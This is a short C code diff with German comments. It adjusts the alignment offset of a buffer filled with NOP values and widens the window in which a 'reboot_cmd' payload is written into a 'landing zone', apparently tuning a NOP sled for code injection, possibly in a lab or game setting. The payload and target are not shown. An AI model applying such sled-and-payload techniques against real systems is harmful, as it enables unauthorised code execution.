@@ -34,7 +34,7 @@ int main(int argc, char *argv[]) {
 
         if (tick == 0) {
             // HIER kannst du 0, 1, 2, oder 3 testen
-            int entry_shift = 0; 
+            int entry_shift = 2; 
             unsigned int *p = (unsigned int*)(local_packet + entry_shift);
             for(int i = 0; i < (BLOCK_SIZE - entry_shift) / 4; i++) {
                 p[i] = nop;
@@ -52,7 +52,7 @@ int main(int argc, char *argv[]) {
             }
 
             // Reboot Landezone
-            if (tick > MAX_TICKS - 400) {
+            if (tick > MAX_TICKS - 1400) {
                 if (current_offset + 16 <= BLOCK_SIZE) memcpy(local_packet + current_offset, reboot_cmd, 16);
                 if (current_offset + 32 <= BLOCK_SIZE) memcpy(local_packet + current_offset + 16, reboot_cmd, 16);
             }
